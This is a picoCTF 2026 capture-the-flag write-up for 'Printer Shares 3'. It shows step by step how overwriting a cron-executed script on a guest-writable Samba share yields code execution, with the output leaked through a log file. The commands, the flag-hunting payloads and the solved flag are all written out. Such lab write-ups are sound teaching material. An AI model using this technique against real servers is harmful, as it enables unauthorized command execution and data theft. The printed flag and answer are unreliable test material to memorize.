# Printer Shares 3 — picoCTF Writeup

**Challenge:** Printer Shares 3  
**Category:** General Skills  
**Difficulty:** Hard  
**Points:** 300  
**Flag:** `picoCTF{5mb_pr1nter_5h4re5_r3v3r53_f17d0589}`  
**Platform:** picoCTF 2026  
**Writeup by:** zham  

---

## Description

> I accidentally left the debug script in place... Well, I think that's fine - No one could possibly access my super secure directory
> two printers are on `64868`, one private, one public.
> you can try `$ nc -vz dolphin-cove.picoctf.net 64868`

**Hint 1:** `a suspicious script is running every minute`

**Hint 2:** `this script runs every minute, you might need to wait for a while`

---

## Background Knowledge (Read This First!)

### What is SMB / Samba?

**SMB (Server Message Block)** is a network protocol for sharing files and printers over a network — it's what lets a Windows machine browse a shared folder on another computer. **Samba** is the open-source implementation of SMB that runs on Linux, which is what's actually answering on the "printer" port here despite the challenge's printer-themed framing.

### What `smbclient` does

`smbclient` is a command-line tool for browsing and interacting with SMB shares directly, without mounting them as a drive first. `smbclient -L //host -p PORT -N` lists every share a server exposes; `smbclient //host/sharename -p PORT -N` opens an interactive session inside one specific share, where commands like `ls`, `get`, and `put` work similarly to an FTP client. The `-N` flag means "no password" — guest access.

### The actual vulnerability

The public share (`shares`) contains `script.sh`, a file that gets run automatically every minute by a cron job on the server, with its output appended to `cron.log` — also inside that same public share. The vulnerability is simple but serious: **the share is writable**. If we can overwrite `script.sh` with our own commands, the cron job doesn't care — it just blindly re-runs whatever is sitting in that file path, on its own schedule, with whatever privileges the cron job runs under.

### Why we route everything through `cron.log` instead of getting a shell

We never get an interactive shell on the server — there's no reverse shell here, no direct command execution channel back to us. What we *do* have is a write path (the script) and a read path (the log) that the server itself bridges for us once a minute. Whatever our injected script prints gets appended to a file we're already allowed to read. That's the entire exfiltration channel.

---

## Solution — Step by Step

### Step 1 — Confirm the server is reachable

```
┌──(zham㉿kali)-[~]
└─$ nc -vz dolphin-cove.picoctf.net 64868
dolphin-cove.picoctf.net [3.13.34.175] 64868 (?) open
```

### Step 2 — List the available SMB shares

```
┌──(zham㉿kali)-[~]
└─$ smbclient -L //dolphin-cove.picoctf.net -p 64868 -N
        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
```

Two disk shares: `shares` is public, `secure-shares` is restricted — almost certainly where the flag lives.

### Step 3 — List what's inside the public share

```
┌──(zham㉿kali)-[~]
└─$ smbclient //dolphin-cove.picoctf.net/shares -p 64868 -N
smb: \> ls
  script.sh                           N       73  Wed Feb  4 16:22:17 2026
  cron.log                            N       86  Sun Jun 21 06:26:01 2026
smb: \> exit
```

### Step 4 — Download both files in one non-interactive command

Using `-c` runs the listed commands one after another with no risk of them getting merged together if typed or pasted quickly:

```
┌──(zham㉿kali)-[~]
└─$ smbclient //dolphin-cove.picoctf.net/shares -p 64868 -N -c "get script.sh; get cron.log"
getting file \script.sh of size 73 as script.sh (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \cron.log of size 172 as cron.log (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

### Step 5 — Read both files

```
┌──(zham㉿kali)-[~]
└─$ cat script.sh
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"

┌──(zham㉿kali)-[~]
└─$ cat cron.log
Health Check: Sun Jun 21 10:25:01 UTC 2026
Health Check: Sun Jun 21 10:26:01 UTC 2026
Health Check: Sun Jun 21 10:27:01 UTC 2026
Health Check: Sun Jun 21 10:28:01 UTC 2026
```

Confirms exactly what the hints said: the script really does run once a minute, and it's just a harmless timestamp for now.

### Step 6 — Replace the script with a flag-hunting payload

```
┌──(zham㉿kali)-[~]
└─$ nano script.sh
```

Replace the contents entirely with:

```bash
#!/bin/bash
echo "Health Check: $(date)"
find / -iname "flag.txt" -exec cat {} \; 2>/dev/null
```

Save with `Ctrl+O` → `Enter` → `Ctrl+X`. Keeping the original Health Check line means the log still looks normal at a glance; the new `find` line searches the entire filesystem for any file named `flag.txt` and prints its contents, with all permission-denied errors silenced.

### Step 7 — Upload the modified script

```
┌──(zham㉿kali)-[~]
└─$ smbclient //dolphin-cove.picoctf.net/shares -p 64868 -N -c "put script.sh"
putting file script.sh as \script.sh (0.1 kB/s) (average 0.1 kB/s)
```

### Step 8 — Wait for the next minute mark, then fetch the updated log

Cron fires right at the top of each minute, so checking immediately after uploading often catches a run that already started with the *old* script. Wait until you're sure a new minute has ticked over, then:

```
┌──(zham㉿kali)-[~]
└─$ smbclient //dolphin-cove.picoctf.net/shares -p 64868 -N -c "get cron.log"
getting file \cron.log of size 303 as cron.log (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

┌──(zham㉿kali)-[~]
└─$ cat cron.log
Health Check: Sun Jun 21 10:25:01 UTC 2026
Health Check: Sun Jun 21 10:26:01 UTC 2026
Health Check: Sun Jun 21 10:27:01 UTC 2026
Health Check: Sun Jun 21 10:28:01 UTC 2026
Health Check: Sun Jun 21 10:29:01 UTC 2026
Health Check: Sun Jun 21 10:30:01 UTC 2026
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_f17d0589}
```

The flag appears right after the first Health Check line generated by our modified script.

---

## Alternative Method — Target the path directly instead of searching

The description hints heavily that the flag sits inside the "super secure directory" — which lines up with the `secure-shares` share name. Rather than searching the whole filesystem, you can guess the underlying path directly:

```bash
#!/bin/bash
echo "Health Check: $(date)"
cat /challenge/secure-shares/flag.txt 2>/dev/null
```

This is faster if the path guess is right, but the `find`-based version in the main solution is more reliable if you don't already know (or want to assume) the exact directory layout.

---

## What Happened Internally

```
Timeline:
1. nc confirms the SMB port is open and reachable
2. smbclient -L reveals two shares: "shares" (public, writable) and
   "secure-shares" (private, where the flag actually lives)
3. The public share contains script.sh (run every minute by a cron job)
   and cron.log (where that script's output gets appended)
4. Downloading and reading script.sh confirms it's just a harmless
   timestamp echo for now
5. Overwriting script.sh with a flag-hunting payload works because the
   share permits writes — cron has no way to know the file changed
6. The cron job's next scheduled run executes our payload with
   whatever privileges it already had — including read access to
   the private share's flag.txt
7. Our payload's output (the flag) gets appended to cron.log, the
   one file in this whole exchange we were always allowed to read
8. Re-downloading cron.log after the next minute boundary reveals it
```

---

## Tools Used

| Tool | Purpose | Level |
|---|---|---|
| `nc -vz` | Confirm the target port is open before doing anything else | Easy |
| `smbclient -L` | Enumerate available SMB shares on the host | Easy |
| `smbclient` (interactive / `-c`) | Browse, download, and upload files inside a share | Medium |
| `nano` | Rewrite the cron-executed script with our own payload | Easy |
| `find / -iname` | Locate a file by name across the entire filesystem, ignoring case | Medium |

---

## Key Takeaways

- **A writable file that's executed automatically is full remote code execution, even with no shell access at all** — you never need an interactive shell if you can control something that already runs on its own schedule
- **Always check write permissions on network shares, not just read permissions** — a "public" share described as harmless can still be the entire attack surface if it's writable
- **When you can't get output back directly, look for an existing output channel to repurpose** — `cron.log` was never meant to leak anything, but it was the one bridge between the private and public sides of this server
- **Cron timing matters during exploitation, not just in theory** — checking a log file half a second before the next scheduled run will show you stale data; patience is part of the exploit
- **Piping multiple `smbclient` commands through `-c` is more reliable than typing them interactively one at a time**, especially over a real terminal session where paste timing can merge separate lines into one
- The flag `5mb_pr1nter_5h4re5_r3v3r53` reads as "SMB printer shares reverse" — a literal label for the technique used: turning the server's own SMB share write-access against itself to reverse-leak data out of a directory we were never allowed to browse directly
